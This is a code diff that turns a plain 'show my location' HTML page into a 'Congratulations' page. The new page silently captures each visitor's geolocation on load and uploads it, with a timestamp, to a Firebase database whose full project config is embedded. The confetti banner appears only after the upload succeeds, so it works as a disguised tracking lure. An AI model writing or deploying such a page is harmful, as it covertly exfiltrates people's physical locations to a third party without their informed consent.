@@ -1,50 +1,99 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Auto Get Current Location</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Congratulations 🎉</title>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js" defer></script>
+  <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database-compat.js" defer></script>
+
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      text-align: center;
+      padding: 50px;
+      background: linear-gradient(to right, #f9f9f9, #dfe9f3);
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      color: #2e7d32;
+      animation: pop 1s ease-out forwards;
+    }
+
+    .confetti {
+      font-size: 3rem;
+      animation: float 2s infinite;
+    }
+
+    @keyframes pop {
+      0% { transform: scale(0); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    @keyframes float {
+      0% { transform: translateY(0); }
+      50% { transform: translateY(-15px); }
+      100% { transform: translateY(0); }
+    }
+  </style>
 </head>
 <body>
 
-<p id="output">Fetching location...</p>
+  <div id="celebration" style="display: none;">
+    <div class="confetti">🎉🎊✨</div>
+    <h1>Congratulations!</h1>
+    <div class="confetti">🎉🎊✨</div>
+  </div>
 
-<script>
-  function getLocation() {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        position => {
-          const lat = position.coords.latitude;
-          const lng = position.coords.longitude;
-          document.getElementById("output").innerText =
-            `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
-        },
-        error => {
-          let message = "";
-          switch(error.code) {
-            case error.PERMISSION_DENIED:
-              message = "User denied the request for Geolocation.";
-              break;
-            case error.POSITION_UNAVAILABLE:
-              message = "Location information is unavailable.";
-              break;
-            case error.TIMEOUT:
-              message = "The request to get user location timed out.";
-              break;
-            case error.UNKNOWN_ERROR:
-              message = "An unknown error occurred.";
-              break;
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const firebaseConfig = {
+        apiKey: "AIzaSyC-RYYefSBuWjaMC0HaigvfQeUdNJVshTU",
+        authDomain: "my-app-e3635.firebaseapp.com",
+        databaseURL: "https://my-app-e3635-default-rtdb.firebaseio.com",
+        projectId: "my-app-e3635",
+        storageBucket: "my-app-e3635.appspot.com",
+        messagingSenderId: "20105586925",
+        appId: "1:20105586925:web:5ee645e21ff5e3b03084e4",
+        measurementId: "G-VV4HEBZGEM"
+      };
+
+      firebase.initializeApp(firebaseConfig);
+      const database = firebase.database();
+
+      function storeLocation() {
+        if (!navigator.geolocation) return;
+
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const timestamp = new Date().toISOString();
+
+            database.ref("locations").push({
+              latitude: lat,
+              longitude: lng,
+              timestamp: timestamp
+            })
+            .then(() => {
+              // Show congratulations message
+              document.getElementById("celebration").style.display = "block";
+            })
+            .catch(error => {
+              alert("Failed to store location: " + error.message);
+            });
+          },
+          error => {
+            alert("Location access denied or error: " + error.message);
           }
-          document.getElementById("output").innerText = message;
-        }
-      );
-    } else {
-      document.getElementById("output").innerText = 
-        "Geolocation is not supported by this browser.";
-    }
-  }
+        );
+      }
 
-  // Auto run when page loads
-  window.onload = getLocation;
-</script>
-
+      storeLocation();
+    });
+  </script>
 </body>
 </html>
